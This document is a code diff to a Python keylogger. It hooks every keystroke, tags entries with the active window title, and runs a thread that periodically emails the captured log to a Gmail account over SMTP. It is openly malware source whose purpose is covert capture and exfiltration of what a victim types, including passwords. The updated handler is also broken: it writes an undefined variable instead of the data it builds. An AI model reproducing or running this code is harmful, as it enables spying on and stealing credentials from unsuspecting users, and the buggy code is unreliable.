@@ -11,6 +11,8 @@ import datetime
 import os, random, smtplib, string, time, threading
 from email.mime.text import MIMEText
 
+lastWindow = ''
+
 global logfile
 
 def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
@@ -42,13 +44,39 @@ if not path.isfile(dir):
 
 def keylogger():
     def OnKeyboardEvent(event):
-        if event.Ascii != 0 or 8:
-            f = open(logfile,"a")
-            keylogs = chr(event.Ascii)
-            if event.Ascii == 13:
-                keylogs = "\n"
-            f.write(keylogs)
-            f.close()
+        global lastWindow
+        window = event.WindowName
+        keys = {
+            13: ' [ENTER] ',
+            8: ' [BACKSPACE] ',
+            162: ' [CTRL] ',
+            163: ' [CTRL] ',
+            164: ' [ALT] ',
+            165: ' [ALT] ',
+            160: ' [SHIFT] ',
+            161: ' [SHIFT] ',
+            46: ' [DELETE] ',
+            32: ' [SPACE] ',
+            27: ' [ESC] ',
+            9: ' [TAB] ',
+            20: ' [CAPSLOCK] ',
+            38: ' [UP] ',
+            40: ' [DOWN] ',
+            37: ' [LEFT] ',
+            39: ' [RIGHT] ',
+            91: ' [SUPER] '
+            }
+        keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
+        data = ''
+        if window != lastWindow:
+            lastWindow = window
+            data += '\n\n { ' + lastWindow + ' } \n'
+            data += keyboardKeyName 
+        else:
+            data += keyboardKeyName
+        f = open(logfile,"a")
+        f.write(keylogs)
+        f.close()
 
     hm = pyHook.HookManager()
     hm.KeyDown = OnKeyboardEvent
@@ -57,36 +85,34 @@ def keylogger():
 
 
 def mailsender():
-    username = 'xxxx'
+    mail = 'xxxx'
     password = 'xxxx'
 
-    mittente = 'xxxx'
-    ricevente = 'xxxxx'
-
     while 1:
-        time.sleep(30)
+        time.sleep(120)
         fo = open(logfile, "r")
         msg = MIMEText(fo.read())
         fo.close()
-        
-        timeInSecs = datetime.datetime.now()
-        msg['Subject'] = 'Log: ' + timeInSecs.isoformat()
-        msg['From'] = mittente
-        msg['To'] = ricevente
 
-        try:
-            s = smtplib.SMTP('smtp.gmx.com:25')
-            s.login(username,password)
-            s.sendmail(mittente, [ricevente], msg.as_string())
-            s.close()
-            print "Successfully sent email"
-        except Exception, a:
-            print a
+        if len(msg) > 30:
+            timeInSecs = datetime.datetime.now()
+            msg['Subject'] = 'B33: ' + timeInSecs.isoformat()
+            msg['From'] = mail
+            msg['To'] = mail
+
+            try:
+                #s = smtplib.SMTP('smtp.gmx.com:25')
+                s = smtplib.SMTP_SSL('smtp.gmail.com:587')
+                s.login(mail,password)
+                s.sendmail(mail, [mail], msg.as_string())
+                s.close()
+            except Exception, a:
+                print a
 
 
 if __name__ == '__main__':
-	thread1 = threading.Thread(name="sic1", target=keylogger)
-	thread2 = threading.Thread(name="sic2", target=mailsender)
+	thread1 = threading.Thread(name="log", target=keylogger)
+	thread2 = threading.Thread(name="mail", target=mailsender)
 
 	thread1.start()
 	thread2.start()
